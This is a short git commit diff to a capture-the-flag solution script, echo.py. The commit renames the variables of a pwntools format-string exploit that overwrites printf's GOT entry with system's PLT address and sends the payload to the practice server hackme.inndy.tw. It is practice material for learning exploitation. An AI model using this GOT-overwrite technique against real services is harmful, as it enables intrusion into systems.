e73b90562dd02692bf8dbfac2d57c2d6dd4ebae2
Yo <a05110511t@gmail.com>
2017-06-30 11:35:20 +0800

    1

--- Inndy_CTF/Pwn/echo.py
+++ Inndy_CTF/Pwn/echo.py
@@ -3,12 +3,12 @@ from pwn import *
 from libformatstr import FormatStr
 r = remote('hackme.inndy.tw', '7711')
 
-printf = 0x0804a010
+printf_got = 0x0804a010
 
-system = 0x8048400
+system_plt = 0x8048400
 
 fmt = FormatStr()
-fmt[printf] = system
+fmt[printf_got] = system_plt
 fmt_str = fmt.payload(7, start_len=0)
 
 r.sendline(fmt_str)
